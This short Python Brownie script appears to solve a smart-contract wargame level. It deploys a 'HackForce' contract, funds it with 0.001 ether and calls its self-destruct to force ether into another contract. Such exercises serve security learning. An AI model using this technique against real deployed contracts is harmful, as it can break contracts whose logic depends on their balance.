from brownie import config, accounts, HackForce

def main():
    deploy()

def deploy():
    account = accounts.add(config['wallets']['dev_account_1']['private_key'])
    hack_force = HackForce.deploy({'from':account}, publish_source=True)
    self_destruct(account, hack_force)

def self_destruct(account, hack_force):
    hack_force._receive({'from': account, 'value':( 0.001 * 10**18)}).wait(1)
    hack_force.selfDestroy({'from': account}).wait(1)
